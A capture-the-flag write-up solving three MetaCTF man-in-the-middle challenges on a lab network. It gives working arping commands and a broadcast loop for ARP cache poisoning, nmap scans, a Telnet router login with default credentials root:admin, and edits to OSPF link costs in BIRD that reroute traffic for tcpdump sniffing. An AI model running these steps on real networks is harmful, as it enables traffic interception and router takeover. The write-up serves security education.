# Interception

This was a series of 3 challenges, revolving around Man-in-the-Middle (MITM) attacks.

## Interception I

> 192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.

This is a basic MITM scenario - we are in the same subnet as the victim, and we need to execute a Layer 2 attack to intercept the communication between 192.168.0.1 and 192.168.0.2.

![](<../../.gitbook/assets/image (79).png>)

### ARP and ARP Cache Poisoning

When 192.168.0.1 sends a packet to 192.168.0.2, at the data link layer, the switch uses the MAC address to decide which device receives the packet - the IP address is invisible to the switch!

The sender must therefore specify a destination MAC address in the packet, but how does the sender know the MAC address of the receiver, given only the IP address?

The [Address Resolution Protocol (ARP)](https://en.wikipedia.org/wiki/Address\_Resolution\_Protocol) is used for this purpose - it essentially allows a computer to "ask" all devices in the subnet which MAC address an IP address belongs to. In order to reduce the amount of ARP requests, each computer also has an **ARP cache**, where recent IP-MAC address bindings are stored.

The issue comes when an attacker sends a malicious ARP response, resulting in the sender sending packets to the wrong MAC address - that of the attacker! This allows the attacker to receive traffic not intended for him.

In fact, we can send a "gratuitous" (or unsolicited) ARP, which is an ARP response that was not prompted by an ARP request, forcing the target computer to change the bindings in its ARP cache, thereby "poisoning" the ARP cache.

Man in the middle attacks using [ARP cache poisoning](https://en.wikipedia.org/wiki/ARP\_spoofing) is much easier and common than you might expect! This is the reason why you should be careful when using public WiFi - someone might very well be assuming the identity of the network gateway.

### Solution

The tools on this machine are quite limited, so we will only be able to use `arping` to send our malicious ARP packets.

First, we need to configure a secondary IP address to the interface, so that we can use this IP in our ARP packets. This would be the IP address of the intended receiver.

`/ # /sbin/ifconfig eth0:10 192.168.0.2 up`

Next, we use `arping` to send a gratuitous ARP (gARP) to the sender (192.168.0.1), saying that our MAC address belongs to 192.168.0.2, the intended receiver.

`/ # arping -c 1 -U -s 192.168.0.2 192.168.0.1`

The flag would then be sent to our UDP port 8000.

```
/ # nc -ul 8000
MetaCTF{addr3s5_r3s0lut1on_pwn4g3}
```

## Interception II

> Someone on this network is periodically sending the flag to ... someone else on this network, over TCP port 8000. Go get it.

This is a slightly more complex scenario - we don't know the IP addresses of the targets!

![](<../../.gitbook/assets/image (90) (1).png>)

### Method 1: Watch the World Burn

This was honestly what came to my mind first, and for the purpose of this CTF it works.

After scanning the network and finding that there were only 90 hosts, ranging from 192.168.0.1 to 192.168.0.90, I wrote a quick shell script to send a gARP for every possible receiving IP address.

This is sent to the broadcast address (192.168.0.255), so all devices on the network will receive this gARP. Whoever the sender is, its the receiver's IP address binding in the ARP cache would definitely have been poisoned by the end of the script.

```shell
i=1
echo $i
while [ $i -le 90 ]
do
    /sbin/ifconfig eth0:$i 192.168.0.$i up
    arping -c 1 -U -s 192.168.0.$i 192.168.0.255
    i=$(( $i+1 ))
done
```

In the `tcpdump` output, we can then see that the sender is 192.168.0.54 and the receiver is 192.168.0.78.

```
/ # tcpdump
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:10:58.645094 IP ip-192-168-0-54.ec2.internal.48746 > ip-192-168-0-78.ec2.internal.8000: Flags [S], seq 3814507201, win 64240, options [mss 1460,sackOK,TS val 1280486540 ecr 0,nop,wscale 7], length 0

...
```

In the real world, however, this would definitely be much noisier and less reliable.

### Method 2: Finding the Open TCP Port

Alternatively, we could simply search for an open TCP port. Since the flag is sent via TCP instead of UDP, we can check that the receiver has the TCP port 8000 open (otherwise, there's no way for it to receive the flag).

`nmap -p 8000 192.168.0.0/24`

We would find that 192.168.0.78 has port 8000 open.

```
Nmap scan report for ip-192-168-0-78.ec2.internal (192.168.0.78)
Host is up (0.000019s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 02:42:0A:01:E5:C3 (Unknown)
```

This tells us that the target is 192.168.0.78, and we can send a single gARP broadcast for ths address.

`arping -c 1 -U -s 192.168.0.78 192.168.0.255`

Listening on port 8000 gives us the flag. `MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}`

## Interception III <a href="#interception-iii-solved" id="interception-iii-solved"></a>

> 192.168.55.3 is periodically sending the flag to 172.16.0.2 over UDP port 8000. Go get it. By the way, I've been told the admins at this organization use really shoddy passwords.

Woah... this is significantly more complicated. So far, we have been doing Layer 2 attacks, and these won't work since the flag is being sent across different subnets. We need to execute an attack from Layer 3, the network layer.

![](<../../.gitbook/assets/image (87).png>)

Perhaps we can gain access to the routers somehow? Indeed, we find the Telnet port open on one of the routers.

```
/ # nmap 192.168.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 15:45 UTC
Nmap scan report for ip-192-168-0-1.ec2.internal (192.168.0.1)
Host is up (0.000016s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet
MAC Address: 02:42:0A:00:3F:C2 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
/ # 
```

The challenge said the admins used "shoddy passwords" - this was true because the Telnet credentials were `root:admin`!

Now that we have access to the router, we need to somehow route the traffic through our attacker-controlled router so that we can sniff it.

From our home directory, we can learn that the router uses BIRD, a routing daemon for Unix operating systems. The BIRD configuration file at `/usr/local/etc/bird.conf` contains some important information.

```
root@router-sales:~# cat /usr/local/etc/bird.conf
# COMPANY BIRD CONFIGURATION

...

protocol ospf {
        ipv4 {
              import filter {
                      if net.len > 24 then reject; else accept; # overly specific routes are sus!
              };
              export filter {
                      ospf_metric1 = 1000;
                      if source = RTS_STATIC then accept; else reject;
              };
        };

        area 0 {
              interface "enp1s0" { # sales - executive dept link
                      type ptp;
                      cost 7;
                      hello 5;
              };
              interface "enp2s0" { # sales - it dept link
                      type ptp;
                      cost 7;
                      hello 5;
              };
              interface "enp3s0" { # it dept - executive link
                      type ptp;
                      cost 8;
                      hello 5;
              };
              interface "enp0s0" {
                      stub;
              };
        };
}
```

Importantly, the [Open Shortest Path First (OSPF)](https://en.wikipedia.org/wiki/Open\_Shortest\_Path\_First) routing protocol is used. Fundamentally, OSPF routers use Link State Advertisements (LSAs) to advertise routes to their neighbours, thus allowing each router to maintain the updated topology at any point in time.

To determine the shortest path (which is the one taken by the packet), each link is associated with a "cost" - this can be calculated through a variety of metrics, such as bandwidth. The path that adds up to the lowest cost is considered the shortest path. We can find the paths configured in the BIRD configuration:

```
interface "enp1s0" { # sales - executive dept link
      type ptp;
      cost 7;
      hello 5;
};
interface "enp2s0" { # sales - it dept link
      type ptp;
      cost 7;
      hello 5;
};
interface "enp3s0" { # it dept - executive link
      type ptp;
      cost 8;
      hello 5;
};
```

In order to sniff the packets, we must make them take the red path below. However, the cost would add up to 14, which is higher than 8 for the shortest path (the blue path)

![](<../../.gitbook/assets/image (93).png>)

We would have to edit the configuration file, and lower the costs of the red links.

```
interface "enp1s0" { # sales - executive dept link
      type ptp;
      cost 1;
      hello 5;
};
interface "enp2s0" { # sales - it dept link
      type ptp;
      cost 1;
      hello 5;
};
interface "enp3s0" { # it dept - executive link
      type ptp;
      cost 8;
      hello 5;
};
```

Now, the "shortest path" goes through our attacker-controlled router!

To reload the configuration, we enter the BIRD CLI:

```
root@router-sales:~# birdc
BIRD 2.0.8 ready.
bird> configure
Reading configuration from /usr/local/etc/bird.conf
Reconfigured
bird> 
```

We should now be able to capture the traffic.

```
root@router-sales:~# tcpdump -i enp1s0 -XX
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on enp1s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:16:33.925661 IP 192.168.55.3.37434 > 172.16.0.2.8000: UDP, length 38
        0x0000:  0242 0a00 4a82 0242 0a00 4a83 0800 4500  .B..J..B..J...E.
        0x0010:  0042 168e 4000 3f11 815f c0a8 3703 ac10  .B..@.?.._..7...
        0x0020:  0002 923a 1f40 002e a3fd 4d65 7461 4354  ...:.@....MetaCT
        0x0030:  467b 6c30 306b 5f61 745f 6d33 5f31 6d5f  F{l00k_at_m3_1m_
        0x0040:  7468 335f 7230 7574 3372 5f6e 3077 7d0a  th3_r0ut3r_n0w}.
```
